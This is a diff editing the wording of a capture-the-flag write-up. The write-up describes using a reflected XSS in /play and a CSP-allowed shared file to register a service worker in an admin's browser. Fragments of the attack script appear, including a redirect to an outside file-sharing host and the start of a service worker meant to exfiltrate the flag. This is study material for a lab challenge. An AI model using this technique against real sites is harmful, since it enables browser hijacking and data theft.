@@ -1,6 +1,7 @@
 # XSS
-Use the reflected xss in /play to run a script from a file shared with the admin (allowed by the CSP).
-Use the XSS to register a service worker in the admin browser.
+The reflected XSS in `/play` can be used to run a script from a file shared with the admin (allowed by the CSP).
+
+The XSS is used to register a service worker in the admin browser.
 
 ```
 <script>
@@ -11,7 +12,7 @@ window.setTimeout(()=>document.location = 'https://filesharing.m0lec.one/upload/
 
 # Service worker
 
-Example of service worker to get the flag
+Example of service worker to exfiltrate the flag
 
 ```
 self.addEventListener('fetch', (e) => {
